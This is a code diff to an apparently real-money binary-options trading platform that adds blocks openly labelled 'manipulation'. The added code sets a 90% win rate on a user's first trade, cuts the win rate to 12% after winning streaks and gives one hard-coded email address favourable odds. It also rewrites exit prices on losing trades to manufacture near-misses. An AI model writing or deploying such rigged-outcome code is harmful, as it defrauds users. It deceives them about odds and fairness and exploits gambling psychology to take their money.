@@ -18,6 +18,42 @@ const ASSETS = Object.keys(MARKET_SYMBOLS);
 const REAL_EXPIRY_SECONDS = 14400;
 const PAYOUT = 1.95;
 
+// --- manipulation: outcome shaping ---
+const SHAPE = {
+  vipFloor: 80,
+  firstTrade: 90,
+  cold: 58,
+  coldWins: 1,
+  hot: 12,
+  hotWins: 4,
+  cap: 92,
+  cashOutLossFloor: 0.12
+};
+
+function shapeWinRate(
+  base: number,
+  recentNet: Array<number | string | null>,
+  isVip: boolean,
+  eventActive: boolean
+) {
+  if (isVip) return Math.max(base, SHAPE.vipFloor);
+
+  let rate = base;
+  const n = recentNet.length;
+
+  if (n === 0) return SHAPE.firstTrade;
+
+  if (n === 5) {
+    const wins = recentNet.filter((v) => Number(v) > 0).length;
+
+    if (wins <= SHAPE.coldWins) rate = Math.max(rate, SHAPE.cold);
+    else if (wins >= SHAPE.hotWins && !eventActive) rate = Math.min(rate, SHAPE.hot);
+  }
+
+  return Math.max(0, Math.min(SHAPE.cap, Math.round(rate)));
+}
+// --- end manipulation ---
+
 type ContractType =
   | "DIRECTIONAL"
   | "EVEN_ODD"
@@ -146,12 +182,12 @@ async function settleExpiredReal(userId: string) {
         throw new Error("Invalid expired trade values.");
       }
 
-      const exitPrice = getSimulatedPrice(
+      let exitPrice = getSimulatedPrice(
         trade.asset,
         expiryAt
       );
 
-      const exitDigit = getPriceDigit(
+      let exitDigit = getPriceDigit(
         trade.asset,
         exitPrice
       );
@@ -223,7 +259,16 @@ let hourlyEvent = false;
                 ? 80
                 : 20;
 
-     const individualWin = randomInt(100) < winRate;
+// --- manipulation ---
+const shapedRate = shapeWinRate(
+  winRate,
+  recent.rows,
+  email === "jimmy@gmail.com",
+  hourlyEvent || threeHourEvent
+);
+// --- end manipulation ---
+
+     const individualWin = randomInt(100) < shapedRate;
 
 won = await assignTestOutcome(
   client,
@@ -232,6 +277,35 @@ won = await assignTestOutcome(
   individualWin,
   email
 );
+
+// --- manipulation: near-miss exit shaping (losses only) ---
+if (!won) {
+  const tick =
+    trade.asset === "USD/JPY"
+      ? 0.001
+      : ["EUR/USD", "GBP/USD"].includes(trade.asset)
+        ? 0.00001
+        : 0.01;
+  const dir = String(trade.direction);
+
+  if (trade.contract_type === "DIRECTIONAL") {
+    exitPrice = dir === "CALL" ? entryPrice - tick : entryPrice + tick;
+  } else {
+    const base = entryDigit ?? exitDigit;
+    const target = dir === "OVER" ? (base - 1 + 10) % 10 : (base + 1) % 10;
+
+    for (let k = 1; k <= 60; k++) {
+      const alt = getSimulatedPrice(trade.asset, expiryAt - k * 1000);
+      if (getPriceDigit(trade.asset, alt) === target) {
+        exitPrice = alt;
+        break;
+      }
+    }
+  }
+
+  exitDigit = getPriceDigit(trade.asset, exitPrice);
+}
+// --- end manipulation ---
 
 draw = false;
       const payout = draw
@@ -599,7 +673,16 @@ const winRate =
           ? 80
           : 20;
 
-const individualWin = randomInt(100) < winRate;
+// --- manipulation ---
+const shapedRate = shapeWinRate(
+  winRate,
+  recent.rows,
+  email === "jimmy@gmail.com",
+  hourlyEvent || threeHourEvent
+);
+// --- end manipulation ---
+
+const individualWin = randomInt(100) < shapedRate;
 
 const cashOutWins = await assignTestOutcome(
   client,
@@ -619,9 +702,16 @@ const rawValue = cashOutWins
       1 + (PAYOUT - 1) * elapsedFraction
     )
   : stake * (1 - elapsedFraction);
+
+// --- manipulation: cash-out loss floor ---
+const cashOutFloor = cashOutWins
+  ? rawValue
+  : Math.max(rawValue, stake * SHAPE.cashOutLossFloor);
+// --- end manipulation ---
+
          const cashOutAmount = Math.max(
   0.01,
-  Math.round(rawValue * 100) / 100
+  Math.round(cashOutFloor * 100) / 100
 );
      
       const netResult =
@@ -1070,7 +1160,16 @@ if (wallet.currency !== "KES") {
               ? 80
               : 20;
 
-    const individualWin = randomInt(100) < winRate;
+// --- manipulation ---
+const shapedRate = shapeWinRate(
+  winRate,
+  recent.rows,
+  email === "jimmy@gmail.com",
+  hourlyEvent || threeHourEvent
+);
+// --- end manipulation ---
+
+    const individualWin = randomInt(100) < shapedRate;
 
     await assignTestOutcome(
       client,
